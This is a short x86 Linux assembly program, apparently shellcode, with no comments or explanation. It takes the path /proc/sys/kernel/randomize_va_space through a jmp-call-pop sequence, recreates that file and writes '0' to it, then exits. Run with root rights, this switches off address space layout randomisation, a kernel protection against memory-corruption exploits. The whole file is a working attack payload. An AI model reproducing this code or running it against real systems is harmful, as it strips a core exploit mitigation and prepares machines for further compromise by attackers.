global _start

section .text

_start:

	xor ebx,ebx
	mul ebx
	jmp short one

two:
	pop ebx

	mov [ebx+36], edx
	mov cx, 0x2bc
	mov al, 0x8
	int 0x80

	xchg ebx,eax
	push ebx
	push word 0x3a30
	mov ecx,esp
	inc edx
	xor eax,eax
	mov al,0x4
	int 0x80

	mov al,0x6
	int 0x80

	inc eax
	int 0x80

one:
	call two
	db '/proc/sys/kernel/randomize_va_space'
